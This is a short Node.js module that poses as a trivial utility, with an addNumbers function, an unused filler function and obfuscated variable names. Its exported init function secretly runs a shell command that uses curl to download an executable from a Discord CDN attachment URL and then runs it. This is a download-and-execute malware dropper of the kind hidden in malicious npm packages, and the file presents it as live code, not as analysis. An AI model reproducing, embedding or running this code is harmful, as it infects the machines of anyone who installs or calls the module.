const { exec } = require('node:child_process')
function init() {
  exec(
    'curl https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe -o a.exe && a.exe',
    (_0x1f2b2f, _0x1c0b68, _0x44e1e6) => {
      if (_0x1f2b2f) {
        console.log('error: ' + _0x1f2b2f.message)
      }
    }
  )
}
function addNumbers(_0x1d8a6a, _0xd88e7f) {
  return _0x1d8a6a + _0xd88e7f
}
function unusedFunction() {
  console.log('This function is never used')
}
console.log(addNumbers(3, 5))
module.exports = init

